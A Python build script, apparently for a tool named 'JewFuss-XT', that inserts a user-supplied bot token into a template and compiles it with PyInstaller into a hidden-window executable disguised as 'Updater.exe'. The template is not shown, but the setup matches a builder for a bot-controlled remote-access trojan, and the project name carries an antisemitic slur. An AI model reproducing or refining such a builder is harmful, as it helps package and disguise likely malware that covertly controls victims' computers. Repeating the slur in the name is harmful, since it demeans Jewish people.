import os
import shutil
import tempfile
import subprocess
import time

save_unpackaged = True  # This is the only thing you should mess with otherwise you may break it

template_path = os.path.abspath('./JewFuss-XT-Updater/Updater.py')
output_dir = os.path.abspath('./JewFuss-XT-Updater/builds')
output_path = os.path.join(output_dir, 'Updater.exe')
log_file_path = os.path.join(output_dir, 'compiler-build.log')
search_string = '# Do not remove or modify this string (compiler looks for this) - 3f298h'

while True:
    user_input = input('Please enter bot token:\n>> ').strip()
    if user_input:
        user_input = f'TOKEN = "{user_input}"'
        break
    else:
        print("Error: input cannot be empty\n")

print("\nTemplate path:", template_path)
print("\nOutput directory:", output_dir)
print("\nOutput location:", output_path)
print("\nLog file path:", log_file_path + "\n")

with open(template_path, 'r', encoding='utf-8') as file:
    lines = file.readlines()

for i, line in enumerate(lines):
    if search_string in line:
        lines[i] = user_input + '\n'
        break

temp_dir = tempfile.mkdtemp()
temp_file = os.path.join(temp_dir, 'temp.py')

if os.path.exists(output_path):
    timestamp = time.strftime('%Y-%m-%d-%H-%M-%S', time.localtime())
    new_name = f"{timestamp}-Updater.exe"
    new_path = os.path.join(output_dir, new_name)
    os.rename(output_path, new_path)
    print(f"\nRenaming {os.path.basename(output_path)} to {new_name}\n\n")
elif not os.path.exists(output_dir):
    os.makedirs(output_dir)

timestamp = time.strftime('%Y-%m-%d %H:%M:%S')

with open(temp_file, 'w', encoding='utf-8') as file:
    file.writelines(lines)

if save_unpackaged:
    with open(os.path.join(output_dir, 'unpackaged-latest.py'), 'w', encoding='utf-8') as file:
        file.writelines(lines)

subprocess.run(['pyinstaller', temp_file, '--onefile', '--windowed', '--noconsole', '--distpath=JewFuss-XT-Updater/builds', '--workpath=JewFuss-XT-Updater/data', '-n=Updater.exe'])
shutil.rmtree(temp_dir)

with open(log_file_path, 'a') as log_file:
    log_file.write(f"\"{timestamp}\": {user_input} Updater.exe\n")
